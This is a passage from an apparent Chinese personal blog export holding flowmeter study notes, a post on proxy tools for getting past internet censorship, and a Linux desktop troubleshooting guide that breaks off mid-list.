<p>传统电磁流量计测量原理如图1所示。 电磁线圈在直径为 d、横截面积为A的管道中产生一个磁场强度为B的磁场。当有流体经过 时会切割磁感线而产生感应电动势 U,测量电极接收电动势信号。由公式 <span class="math inline">\(Q={1 \over k}*{UA \over Bd}\)</span> 可计算其流量。式中:Q为流量;k为修正系数。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830182933.png" alt="传统流量计" /></p>
<p>电容式电磁流量计解决了电极表面附 着、腐蚀、摩擦等问题 ,其电极与被测流体间有绝缘 衬里隔离,或者直接采用绝缘测量管, 结构如图 2 所示。电极与被测流体通过绝缘管形成检测电容,通 过此电容来耦合流量信号。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183016.png" alt="对比" /></p>
<h4 id="电磁流量计的优化改进">电磁流量计的优化改进</h4>
<p>普通的电磁流量计只能测量满管流的流量,常见的非满管电磁流量计有下面几种：</p>
<ol type="1">
<li>多电极式非满管电磁流量计。其底部是一对信号注入电极,中间有多对测量电极,顶端有一个满管电极。当流体非满管时,满管电极检测到管道非满状 态,利用算法修正测量值,此时流量计的测量方式改 成测量流体流速和液面高度。信号注入电极与在不同位置的三对测量电极共同工作,用于测量液位面的高度和流体的速度。</li>
<li>电容式非满管电磁流量计。电容式非满管电磁流量计就是利用液位的变化使 得电容的极距发生变化,通过测量发送电极和检测电 极之间的电容耦合值即可测量流量值。</li>
<li>利用阻抗或信号衰减研制的非满管电磁流量计。其结构是流量管底部贴一对信号发射电极,在流量管中间贴信号接收电极。由于信号在流体 中传播会产生衰减,且传播时间越长,衰减越多,因此 通过信号接收电极接收到的信号衰减量即可得知液面高度; <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183034.png" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183044.png" /> 励磁方式可以分为两种基本 形式,即采用交变磁场的形式(包括正弦波励磁、矩形 波励磁、三值波励磁和双频矩形波励磁) 和采用恒定 磁场的形式(包括直流电源励磁和永磁体励磁)。</li>
</ol>
<p>相对于交变磁场励磁方式来说,恒定磁场励磁的 方式实现起来更加简单,受工频干扰影响小,而且使用 恒定磁场励磁可以简化传感器结构</p>
<h4 id="电磁流量计与其他测流量原理仪器的比较">电磁流量计与其他测流量原理仪器的比较</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 15%" />
<col style="width: 21%" />
<col style="width: 21%" />
<col style="width: 21%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">产品名称</th>
<th style="text-align: left;">原理</th>
<th style="text-align: center;">优点</th>
<th style="text-align: center;">缺点</th>
<th style="text-align: center;">备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">电磁流量计</td>
<td style="text-align: left;">电磁感应</td>
<td style="text-align: center;">适合满管污水测量</td>
<td style="text-align: center;">不能测非满管污水和干净的水体</td>
<td style="text-align: center;">多适用于工业污水处理等场合，管径不同价格不同</td>
</tr>
<tr class="even">
<td style="text-align: left;">超声波流量计时差法</td>
<td style="text-align: left;">超声波时差</td>
<td style="text-align: center;">适合于干净水体的流量测量可以外贴在管道外侧</td>
<td style="text-align: center;">不能测非满管污水和中污以上的水体</td>
<td style="text-align: center;">多适用于供水等场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">超声波明渠流量计</td>
<td style="text-align: left;">水位换算流量</td>
<td style="text-align: center;">价格便宜，原理简单</td>
<td style="text-align: center;">需要修建堰槽且 对；水体有阻碍作用、精度较低</td>
<td style="text-align: center;">适合于小渠道等能够修建堰槽的场合，宽渠道或者非规则渠道无法使用</td>
</tr>
<tr class="even">
<td style="text-align: left;">雷达流速仪</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">安装简单不易损坏</td>
<td style="text-align: center;">起始速度较高，无法测量流速较慢的水体，由于测量水表面的流速，容易受波浪影响</td>
<td style="text-align: center;">适合大江大河等流速较大或者安装要求简便的场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">多普勒超声流量计</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">测量精度高，起始速度低，安装简便，能够测量非满管和不规则断面的流速流量</td>
<td style="text-align: center;">较宽的渠道需要多台设备同时使用</td>
<td style="text-align: center;">城市下水道、管网、灌区、河道、渠道水电站等</td>
</tr>
</tbody>
</table>
<h4 id="参考">参考</h4>
<ol type="1">
<li>AMARE T. Design of an electromagnetic flowmeter for insulating liquids[ J]. Measurement Science &amp; Technology, 1999, 10 ( 8 ): 755 - 758.</li>
<li>DONEY B. Going with partial flow[ J]. Control Engineering,1998, 45(12):131 - 133.</li>
<li>BERA, S. C., CHAKRABORTY, B.. A Novel Technique of Flow Measurement for a Conducting Liquid[J]. IEEE Transactions on Instrumentation and Measurement,2009,8(8).</li>
</ol>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>传感器</tag>
        <tag>电磁流量计</tag>
      </tags>
  </entry>
  <entry>
    <title>网上冲浪指北</title>
    <url>/87d6/</url>
    <content><![CDATA[<p>欢 度 国 庆 <span id="more"></span></p>
<h2 id="时隔一年的更新">时隔一年的更新</h2>
<p>由于这一篇写的太乱，我重新开了个坑，见<a href="https://zhangjk98.xyz/surfing-the-internet-2/">网上冲浪指北（二）</a>。这一篇已经过时，不用再看了。</p>
<h2 id="近况">近况</h2>
<p>听说9月16号风雨交加,电闪雷鸣，好多梯子集体。AWS的ip据说都被封了一批。 使用v2ray的我依然苟活，我这一阵使用体验是，ws+tls+cdn是最稳的。嫌麻烦可以直接ws，反正不建议v2ray用http伪装了，容易被制裁。最近我的MTproto也挂了，貌似最近telegram的专用代理被针对得很厉害。 另外建议避开美日港等线路。 备用应急找几个还勉强能用的备着，比如setup v某n</p>
<p>更新,kcptun,mkcp,finalspeed . GIA线路最好不要用。 最近ss和ssr大面积爆破，v2ray还能苟，不行直接上trojan。 使用aes加密基本都被搞，好像是ssr有混淆，墙无法识别，直接封。 祝你ping安</p>
<p>还是要保持优良传统,努力学习<del>元件耦合</del>计算机网络: &gt;大一的电路分析老师曾说过：“在文化大革命的时候，国家曾封锁电台。我们的同学们啊用自己的器件组装了一个电台，他能覆盖整个四川地区甚至云南和贵州也能收到。于是四川人民天天就听着成电广播，后来这事闹大了，办电台的同学要被批斗，还是周总理亲自来把这事压下去了。能做出那么好的电台，是元件耦合做得好，同学们，可见元件耦合有多么重要啊！”</p>
<p>另，移动网经常搞些dns劫持之类的动作，会造成一些干扰，我们参照这个配置 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3YycmF5L3YycmF5LWNvcmUvaXNzdWVzLzE4MDg=">https://github.com/v2ray/v2ray-core/issues/1808<i class="fa fa-external-link-alt"></i></span> 改一下服务器dns配置：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"dns"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
<span class="token property">"server"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
<span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span>
<span class="token string">"1.1.1.1"</span><span class="token punctuation">,</span>
<span class="token string">"localhost"</span>
<span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实这个时候可以直接上dnscrypt解决问题</p>
<p>另外, v2ray的服务器和本地的时间一定要记得用ntp同步一下,不然两边时间不一样也会拒绝连接的</p>
<h2 id="trojan的方案">Trojan的方案</h2>
<p>原理和v2ray的websocket+TLS差不多，只在乎延迟和速度的话，Trojan比v2ray的websocket+TLS一般会快一点（其实大部分时候也就快了不到10%） 但是Trojan没有好的客户端（特别是安卓），路由器上折腾也没有特别好的方案 而且不支持CDN。</p>
<p>真追求速度也不太建议这个，理论上websocket肯定比KCP慢，折腾党可以试试。特殊时期可以留一条这样的备用线（备用防封），另一条线裸跑ss走大流量的，就差不多够了。</p>
<h2 id="更新">更新</h2>
<p>最近<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL3ZtemowNC5wZGY=">基于长短期记忆网络的V2ray流量识别方法<i class="fa fa-external-link-alt"></i></span>好像在微博等地引起了小小的恐慌。这个大概就是解包后上神经网络之类的，和之前的一篇 <span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2RvY3VtZW50LzgwNDgxMTY=">https://ieeexplore.ieee.org/document/8048116<i class="fa fa-external-link-alt"></i></span> 步骤、程序都是一样的，就把随机森林换成了k近邻，高度怀疑是水论文。这个也就针对一下vmess、tcp，tls估计搞不定。</p>
<p>不过v2ray作者弃坑几个月了，不知道近况如何</p>
<h3 id="最后还是选择了机场">最后还是选择了机场</h3>
<p>现在性价比还是机场最高，同样是每月5美元机场大概能提供远高于自建的速度和线路选择（还有很多Netflix线路和低延迟节点）。</p>
<h3 id="移动dns投毒解决方案2019">移动DNS投毒解决方案2019</h3>
<p>使用Pcap_DNSProxy, 先下载<span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9kb3dubG9hZC5odG1s">nmap<i class="fa fa-external-link-alt"></i></span>再选winpcap兼容模式安装,再下载Pcap_DNSProxy安装时可能需要管理员权限。然后在网卡设定 DNS 解析为 127.0.0.1 (IPv4) 和 ::1 (IPv6) 。（适合电脑上折腾，有条件还是直接折腾路由器。） 详情参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZW5ncjI4L1BjYXBfRE5TUHJveHkvdHJlZS9tYXN0ZXIvRG9jdW1lbnRz">https://github.com/chengr28/Pcap_DNSProxy/tree/master/Documents<i class="fa fa-external-link-alt"></i></span> 以及<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJnbWUubWUvcG9zdHMvc29tZS1pZGVhcy1hYm91dC1hbnRpLXBvbGx1dGlvbi1kbnMtc2VydmVy">https://blog.bgme.me/posts/some-ideas-about-anti-pollution-dns-server<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="更换vps厂商为hostwinds更换websocket协议为http2">更换VPS厂商为hostwinds,更换websocket协议为HTTP2</h3>
<p>决定把vultr换成速度更快的hostwinds，世界加钱可及（并没有钱搞Google Fi之类的物理穿越） hostwinds选项有VPS和cloud，cloud是按小时收费的，这个价位当然也不是aws或google cloud那种真正的云主机，问了下客服，答复如下：</p>
<p>The Difference Between VPS &amp; cloud There is no difference other than the name. The VPSs come with more of a preconfigured set up, Linux/Windows, managed/unmanaged, etc, where the Cloud would start as an unmanaged Linux VPS that you can add additional set up to.</p>
<p>这里我不小心选错了，发工单申请退款速度很快，客服一直在线（但是据说支付鸨坑你会给你退到余额里，不会给你退钱） 不愿意买一个月冒险想先试试的可以直接上小时收费的cloud选项 这家服务商有给提供rDNS功能，网上冲浪时记得伪装。别的都还好，就是机房有点少，不过暂时还没被盯上。速度也还行吧。（这家不太推荐用来建站, 小站除外）</p>
<p>看起来并不限速，但是我装上之后速度只有几百k，不知道为什么，有空再看看 &gt;Testing download speed................................................................................ Download: 248.93 Mbit/s Testing upload speed................................................................................................ Upload: 397.44 Mbit/s</p>
<p>应该是被运营商Qos降了优先级，还是kcp吧</p>
<h2 id="配置推荐">配置推荐</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpbnVlcnpoL2dvc3Q=">gost<i class="fa fa-external-link-alt"></i></span> 用来搞搞跳板和二级代理和多级代理的跳板不错 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BUYWNoeW9uRGV2ZWwv5ryr6LCI5ZCE56eN6buR56eR5oqA5byPLWRucy3mioDmnK/lnKjku6PnkIbnjq/looPkuK3nmoTlupTnlKgtNjJjNTBlNThjYmQw">漫谈各种黑科技式 DNS 技术在代理环境中的应用<i class="fa fa-external-link-alt"></i></span> DNS什么的看这里 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span> 跨平台的全局代理 <span class="exturl" data-url="aHR0cHM6Ly93d3cudjJyYXkuY29tLw==">Project V<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ndWlkZS52MmZseS5vcmcv">新 V2Ray 白话文指南<i class="fa fa-external-link-alt"></i></span> 推荐稍微懂一点网络知识和能自己折腾VPS的自己直接照着文档和教程装就好了，一键安装脚本反而坑多（VPS小鸡只用来干这个可以直接脚本，但是至少要把默认端口之类的改一改） <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL216ejIwMTcvVjJSYXlB">v2rayA<i class="fa fa-external-link-alt"></i></span> 一个linux下的web配置工具，感觉还行。linux下图形界面客户端一直是个问题，这种小配置工具拿Qt或者electron搞出来的巨大的包总感觉怪怪的，还是直接web化在浏览器里面启动比较舒服 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc29mdGV0aGVyLm9yZy8=">https://www.softether.org/<i class="fa fa-external-link-alt"></i></span> 使用ssl型加密的vpn也有比较强的抗封锁能力（由于历史原因，属于第一批被墙打爆的重点照顾对象），但是搭建配置非常麻烦，速度也比v2慢，建议放弃（包月包年买服务另当别论） 这里有个wulabing的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1bGFiaW5nL1YyUmF5X3dzLXRsc19iYXNoX29uZWtleQ==">脚本<i class="fa fa-external-link-alt"></i></span> 卸载要这样。 &gt;如果不能重装系统，你可以通过删除以下文件夹，重新安装来完成更新 /etc/nginx /etc/v2ray /root/v2ray ~/.acme.sh</p>
<p>另， https://github.com/edwardz246003/shadowsocks</p>
<p>最后，土豪请直接机场，大土豪请去用境外实体卡和Google Fi</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/www.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统的抢救和维护（桌面篇）</title>
    <url>/linux-rescue/</url>
    <content><![CDATA[<p>这篇水文主要是写给桌面玩家看的，如果您的服务器打出了GG/被黑了/库被删了，可能不适合来这里找答案。 <span id="more"></span></p>
<p>由于这篇水文是写给普通玩家的，所以尽量简单易懂、适合萌新操作。所以像eBPF、Systemtap这样的神兵利器几乎不会多讲 （这还是我在《性能之巅》这本书看到作者传教DTrace才了解的，这些东西对于一般路过普通用户大概就像vim和emacs, 很强，但是学习成本太高） 这里面有一些systemd的内容，openrc用户请跳过（相信这年头还在坚守openrc和其他非systemd的用户水平应该不用看我博客）。 由于本人水平有限，而且这篇写的比较仓促，文中可能有不少错误，光临我博客的大佬们发现了请告诉我。 暂时先写这么多，还有很多有意思的、重要的、不好写的没有写，以后再更新。</p>
<h2 id="通常的卡死解决流程">通常的卡死解决流程</h2>
<h3 id="说明">说明</h3>
<ol type="1">
<li>此处的“卡死”，指鼠标动不了或某个应用、进程没有响应了</li>
<li>以下流程展示以KDE和Archlinux为例</li>
<li>如果你想问ubuntu内部错误等，那我只能说无可奉告</li>
</ol>
<h3 id="通用流程">通用流程</h3>
<p>相比于Linux/Unix在服务器上几年不关机稳如狗的表现，桌面环境和应用的崩溃和卡死是常事，各种小bug就更多了，毕竟用爱发电的开源拖拉机没那么多人手和资金用在测试和GUI体验上，<strong>要习惯，不要大惊小怪，也不要死机了就一言不合重启重装</strong></p>
<p>虽然KDE、GNOME都有图形化的系统监视器，看起来还不错。然鹅，有点鸡肋：<strong>鼠标经常随着图形界面在x11、wayland罢工后一起没了，键盘几乎能战斗到最后一刻</strong>（除非 kernel panic 或者 usb等外设的kernel module出问题了）。请适应并熟悉终端模拟器、tty、vim等键盘操作。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果能，那问题应该不大，然后用<code>htop</code>、<code>glances</code>之类的东西看一下罪魁祸首是谁。</p>
<p>找到那个进程的pid，试试杀掉它。比如vscode内存泄漏动不了了，那就<code>pkill code</code>(相当于<code>ps -ef | grep vscode | awk '&#123;print $2&#125;' | xargs kill -9</code>)。 如果你不知道具体叫什么，但是它在屏幕前能看到，可以用<code>xkill</code>命令终止它（如果你还能动鼠标）</p>
<p>如果程序或应用是systemd守护进程，用systemctl停掉或重启（openrc、crontab、pm2等同理），比如<code>systemctl disable neo4j --now</code>禁用并停止neo4j数据库的daemon；<code>systemctl daemon-reload &amp;&amp; systemctl restart kubelet</code>刷新配置并重启kubelet（咦，好像没有桌面玩家在自己电脑上跑kubelet进程...一时没想起更好的例子）</p>
<p>提供了禁用命令的优先用自带命令，比如禁用KDE自带的文件搜索baloo，<code>balooctl stop &amp;&amp; balooctl disable</code></p>
<p>如果怀疑是KDE桌面及其组件的问题</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">plasmashell --replace<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常退出不行就试试killall</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者重启一下SDDM</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sddm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还不行就杀掉tty1，然后重启xorg</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> tty1 <span class="token comment"># 或者pgrep tty1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启。或者这样</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">pkill</span> x
startx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>那如果你连tty都切不过去，就用魔术键重启。（如果你提前设置开启了魔术键SysRq的话，这个下面再讲） 按住<code>Alt+Shift+SysRq</code>，依次按<code>REISUB</code>这几个键。（每按一个键停几秒钟）（如果你内核出了kernel panic之类的问题，那魔术键也没用）</p>
<p>再不行直接<code>reboot</code>，<code>shutdown -r now</code>就好了</p>
<p>以上的命令如果桌面经常卡死建议绑定到你喜爱的快捷键上（在动不了鼠标和快捷键调不出终端模拟器的时候能用上）</p>
<p>再不行就直接尝试长按电源关机了（一般长按电源键5-10秒，这取决于你的主板BIOS设置，这会发送一个<code>RESET</code>信号）。如果你的主板有复位键，就按复位键重启。实在实在没办法那就拔电源吧。（做好丢失所有未保存数据的准备）</p>
<p>ps: 如果你用的ext4，那恭喜你，中奖了。异常掉电可能不是丢失数据这么简单了，你的文件系统可能已经出了小问题。（这个后面再说）</p>
<h3 id="如何终止重启进程">如何终止/重启进程</h3>
<h4 id="首先找到它">首先找到它</h4>
<p>以vscode为例：<code>ps aux | grep vscode</code>或<code>pgrep -fl vscode</code>（<code>-f</code>参数表示<code>use full process name to match</code>，如果不加<code>-f</code>是找不到vscode的，只有<code>grep code</code>能找到进程（因为这个进程名字叫code））</p>
<p><img src="/linux-rescue/1618143574.png" /></p>
<p>如果不想让<code>ps aux | grep xx</code>的时候每次都显示他自己，再加上<code>|grep -v "grep"</code> 如果能在屏幕上看到它就直接<code>xkill</code></p>
<h4 id="然后">然后</h4>
<p>kill的方式大概有这些</p>
<pre class="line-numbers language-none"><code class="language-none">HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>比较常用的有HUP(通常在关闭终端模拟器的时候，调用SIGHUP，可以用<code>nohup</code>等命令让终端模拟器关闭后进程继续)、QUIT（退出，调用SIGQUIT，<code>Ctrl+\</code>）、KILL（调用SIGKILL，使用<code>kill -9 就是这个</code>）。此外还有TERM（软中断），开发板常用，桌面用户可能用的不多。</p>
<p><code>Ctrl+z</code>调用的就是SIGTSTP，这是最温和的一种，挂起的进程可以用<code>fg</code>恢复;<code>Ctrl+c</code>调用的就是SIGINT，会终止进程。</p>
<p>这部分内容可以去阅读《UNIX高级编程》等书，或者看看维基词条<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5peOS/oeWPtw==">Unix信号<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="碰到比较严重情况的抢救">碰到比较严重情况的抢救</h2>
<p>这种情况包括但不限于不小心卸载了系统自带的python、卸载了iptables、卸载了桌面环境（DE）或者卸载了什么重要的库，或者你改了什么<code>kernel parameter</code>直接黑屏进不去了，又或者你执行了危险的<code>dd</code>命令。</p>
<p>有或者显卡驱动有问题了</p>
<p>或者双系统Windows更新把你grub整没了（不要双系统就没这么多事，直接上<code>systemd-boot</code>之类的东西）</p>
<p>反正，开机直接黑屏了。或者你运气好，能进grub界面，还能抢救一下。或者运气更好，进了grub界面然后在DM那里黑屏了（这种可能是显卡驱动的问题）</p>
<p>你可能需要一个LiveUSB用来抢救。如果你没设置加密，那就挂载<code>\</code>, <code>\home</code>, <code>\boot</code>等目录然后chroot进去修。</p>
<p>试试重装重要的包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S base base-devel linux linux-firmware linux-headers xorg plasma kde-applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="文件系统损坏">文件系统损坏</h3>
<p>比如，ext4断电。</p>
<p>如果你的电脑要经常面对断电等恶劣情况，那建议去用ZFS等文件系统，不要用ext4</p>
<h3 id="kernel-panic-等">kernel panic 等</h3>
<p>Kernel panic之类的问题通常比较严重</p>
<p>kernel panic segmentation fault core dump</p>
<p>https://wiki.archlinux.org/index.php/Core_dump#Examining_a_core_dump</p>
<h3 id="看看是不是硬件坏了">看看是不是硬件坏了</h3>
<p>内存条没插紧、硬盘坏了、电源没插好、主板受潮了。。。。</p>
<h2 id="排查问题">排查问题</h2>
<p>排查问题和调试比较需要经验，而且要花费不少时间。调试并修好，很有可能比直接重装所花费的时间、精力多得多。<strong>如果你赶时间，我建议做好备份，随时重装。不要将有限的时间浪费在排查问题上。</strong></p>
<!-- 
![do you have a life?](/linux-rescue/1618281436.png)

图源[reddit u/sovietarmyfan](https://www.reddit.com/r/linuxmemes/comments/ejdkaj/choosing_an_os_my_own_version/)
 -->
<p><strong>但是，追根溯源找到问题并修好它，很有意思，不是吗？</strong></p>
<p>网上充斥着性能优化的教程，好多都盗了下面这张图，不仅不标注<span class="exturl" data-url="aHR0cDovL3d3dy5icmVuZGFuZ3JlZ2cuY29tL2Jsb2cvMjAxOS0wNy0xNS9icGYtcGVyZm9ybWFuY2UtdG9vbHMtYm9vay5odG1s">来源<i class="fa fa-external-link-alt"></i></span>还把右下角来源抹去（而且还是17年版的老图传来传去） <img src="/linux-rescue/1618031552.png" /> 本来想仿照这个做一个调试的图，但是想到指不定又被盗了。算了，随便写点大家将就着看吧。</p>
<h3 id="查看报错和日志">查看报错和日志</h3>
<p>遇到解决不了的问题先把报错和版本信息记下来，然后去谷歌一下，搜不到的就去拿着详细的报错去相应的地方请教大佬（希望您提问之前已经阅读了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5oYW53dS9Ib3ctVG8tQXNrLVF1ZXN0aW9ucy1UaGUtU21hcnQtV2F5L2JsbyUyMGIvbWFpbi9SRUFETUUtemhfQ04ubWQ=">《提问的智慧》<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9jb29sc2hlbGwuY24vYXJ0aWNsZXMvMTA4MDQuaHRtbA==">X-Y Problem<i class="fa fa-external-link-alt"></i></span>等）</p>
<p>进入急救模式</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl rescue
systemctl emergency<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">journalctl -x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="如何调试内核">如何调试内核</h3>
<p>用户态的问题都还比较好调试，总不至于崩了连个报错信息和崩溃日志都保存不下来。内核相关的问题比较麻烦，不过好在除非自己各种折腾或者用Arch这种内核经常滚动升级的，一般碰不到这些问题。</p>
<p>我调试内核的经验也不多，为数不多的几次几乎都是当年在开发板上。sniper写得那个《Linux内核调试指南》写得挺好，然而不太适合普通的桌面玩家，而且有一点年头了。gdb调试，printk在桌面发型版kernel panic的时候几乎都失效了。对于普通的桌面玩家，遇到了 kernel panic 等严重问题，发现自己解决不了，不妨去论坛/群里提问，找有空的大佬帮你看看（有些小白尝试debug的时候可能越折腾问题越严重）。桌面玩家检查一下自己最近干了什么或者最近系统更新了什么应该就能找到问题了。</p>
<p>常见的调试方式包括：</p>
<ol type="1">
<li>Kdump+crash</li>
<li>Serial Console</li>
</ol>
<p>用kdump捕获错误（kdump会在内核崩溃的时候用kexec运行捕获内核然后转储），然后用crash看一下。使用之前Kdump你可能需要自己编译内核，在内核参数里面设置参数，然后还要设置systemd守护进程。 ArchLinux玩家可以参考ArchWiki的<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0tkdW1w">Kump<i class="fa fa-external-link-alt"></i></span>条目设置（Archlinux默认没装需要的包，Wiki也没说，要装一下<code>sudo pacman -S kexec-tools crash</code>。）</p>
<p>Serial Console 串口调试这个折腾过嵌入式的应该也很熟悉了，需要在bootloader设置一下。 Arch用户也可以参照ArchWiki词条<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1dvcmtpbmdfd2l0aF90aGVfc2VyaWFsX2NvbnNvbGU=">Working with the serial console<i class="fa fa-external-link-alt"></i></span>设置（我只在树莓派上的archarm试过串口，并没有用这种方法调试过内核） 大部分桌面用户的笔记本和台式机上可能已经没有串口了（仅存不多的可能也就给个针脚），搞一个USB转串口才能愉快的调试。</p>
<p>一般桌面用户出现内核问题用journalctl看一下日至或者拍一下屏幕上的错误然后到群里/论坛请教就行了。见：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0dlbmVyYWxfdHJvdWJsZXNob290aW5nXyjnroDkvZPkuK3mlocpI+WGheaguOW0qea6g18oS2VybmVsX3Bhbmljcyk=">ArchWiki: General_troubleshooting_(简体中文)#内核崩溃_(Kernel_panics)<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="例子">例子</h4>
<p>Go mod 命名导致的问题：<span class="exturl" data-url="aHR0cHM6Ly94dWFud28uaW8vMjAyMC8xNC1idWctaW50cm9kdWNlZC1ieS1iaW5hcnktbmFtZS8=">记一次二进制乱起名字引发的翻车<i class="fa fa-external-link-alt"></i></span></p>
<p>我几个月前被和漩涡这个翻车一模一样的问题坑了。</p>
<h3 id="调试驱动问题">调试驱动问题</h3>
<p>驱动这个我单独讲一下。因为网上搜“驱动调试”都是嵌入式开发（几年前我）需要的（会叫你用strace、gdb、printk）,对于桌面用户（现在的我）应该去搜关键词：“型号+Linux”。不过如果你不用螃蟹网卡、Nvidia双显卡、某些阴间网卡、不支持Linux的BIOS，应该不用担心。用的XPS、Thinkpad系列等对Linux支持比较好的笔记本应该也不用担心。</p>
<h4 id="例子-1">例子</h4>
<p>我用一个PS\2键盘(P口键盘)为例演示一下:</p>
<p>OS：Archlinux 主板：b85 Kernel：Linux-lts 5.10 CPU：intel i5-4590 键盘：PS2口的老键盘 症状：PS\2键盘插上去用不了</p>
<ol type="1">
<li>首先用<code>dmesg</code>等工具检查一下，没啥问题。然后重启（PS\2不支持热插拔，保险期间重启试试）</li>
<li>除了通用驱动会被合并到kernel主线，大部分驱动是<code>kernel module</code>的形式。所以我们先<code>lsmod</code>看一下有没有PS\2相关的东西。只找到了<code>psmouse</code>（先假装不知道i8042是干嘛的）</li>
<li>然后去找相关的驱动呗。搜一下“PS\2键盘 驱动”，搜出来第一条是微软的文档，不过没关系，它告诉我们是i8042了。再<code>lsmod</code>看一下，它有。再<code>modprobe i8042</code>看一下，也是好的。</li>
<li>再搜一下启动参数就发现PS\2和atkbd这个模块有关，然后就顺手搜到这个：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Y24ub3JnL2xpbnV4LTMxMy13YXJuaW5nLXBzMi1rZXlib2FyZC1zdXBwb3J0LWlzLW5vdy1tb2R1bGFyLw==">Linux 3.13 警告：PS/2 键盘支持现已模块化<i class="fa fa-external-link-alt"></i></span>。</li>
